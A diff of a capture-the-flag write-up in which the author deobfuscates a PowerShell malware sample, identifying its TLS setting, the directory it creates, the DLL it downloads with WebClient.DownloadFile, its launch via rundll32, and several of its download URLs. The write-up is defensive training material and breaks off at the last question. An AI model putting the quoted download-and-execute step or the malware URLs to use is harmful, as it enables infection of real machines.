@@ -17,7 +17,7 @@ PowerShell is a wildly effective tool for managing Windows devices and networks.
 1. TOC
 {:toc}
 
-## Background
+# Background
 > Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack? Reading Material: https://malware.news/t/deobfuscating-powershell-putting-the-toothpaste-back-in-the-tube/23509
 
 So, it looks like the only real question in all of this is what malware is responsible. Let's take a look at the sample before we go any further. 
@@ -44,7 +44,7 @@ Much better!
 
 While my preference would be to start working to clean this up right off te bat, we already know we have some questions to answer, so let's look back at the challenge and see what it wants us to find.
 
-#### Question 1
+## Question 1
 > What security protocol is being used for the communication with a malicious domain?
 
 OK, so if it's about SSL, TLS, etc, here. Which protocol is the malware using to mask its communications. On line 8, we see this:
@@ -55,7 +55,7 @@ OK, so if it's about SSL, TLS, etc, here. Which protocol is the malware using to
 
 Earlier, I mentioned that PowerShell effectively ignores capitalization for most input. Well, it also uses backtick operators (\`) to allow for creating tabs and new lines in string outputs. If the backtick is used without the new line/tab/space, PowerShell simply ignores the backtick and concatenates the input before and after it instead. In this case, the backticks are used to obfuscate the string, likely as a way of visually breaking up the text so it's less legible during analysis, but it also could get around some basic signature-based analysis. Looking at this line holistically, we see that the variable `mbu` is having the value `sEcuRITYproTocol=Tls12` set/applied, so our answer to the question is TLS 1.2, a fairly secure protocol.
 
-#### Question 2
+## Question 2
 > What directory does the obfuscated PowerShell create? (Starting with \HOME\)
 
 For this question, it's giving us a pretty big hint with the HOME reference. We can already see (line 6) that there's a `createdirectory` value, which gets set to $HOME with a long string following it. 
@@ -72,7 +72,7 @@ If this is correct, the correct answer should be `\HOME\Db_bh30\Yf5be5g`
 
 __Solved!__
 
-#### Question 3 
+## Question 3 
 > What file is being downloaded (full name)?
 
 Now that we have the directory created by the malware, finding this should be a breeze. Looking at lines 9-11, we see 3 variable declarations, but only one is reused later in the script. Based on the obfuscation, it's possible that the other who are referenced within other obfuscated lines. However, since `$Swrp6tc` shows up in full in line 12, which also references the `$HOME` directory, I'll start there and see what we got. 
@@ -92,7 +92,7 @@ A69S.dll
 ```
 And there's our file name!
 
-#### Question 4
+## Question 4
 > What is used to execute the downloaded file?
 
 Now, we're in the home stretch. We know the script is using `$Imd4yck` as a reference to the file. In line 16, we see `try{(&(New-Object) System.Net.WebClient.DownloadFile($Bm5pw6z, $Imd1yck)`
@@ -104,12 +104,12 @@ https://admintk.com/wp-admin/L/@https://mikegeerinck.com/c/YYsa/@http://freelanc
 ```
 It looks like 7 URIs separated by @ symbols. On line 18, we see the script check whether the downloaded file is a valid size. If it is, it continues by executing rundll32, pointing at the newly downloaded DLL. Looking back at the question, we have our answer, `rundll32`.
 
-#### Question 5
+## Question 5
 > What is the domain name of the URI ending in '/6F2gd/'?
 
 Fortunately, we previously ran `$B9fhbyv` through PowerShell and decoded the list of URIs. Looking back at the list we see the last item ends in `6F2gd`, so we just input the domain itself `wm.mcdevelop.net`!
 
-#### Question 6 
+## Question 6 
 > Based on the analysis of the obfuscated code, what is the name of the malware?
 
 You can fairly easily pull out bits from this script that are unlikely to change, and then run a search to see whether these have been seen before. For this, I took the created directory and ran that across Google to see if anything glaring showed up:
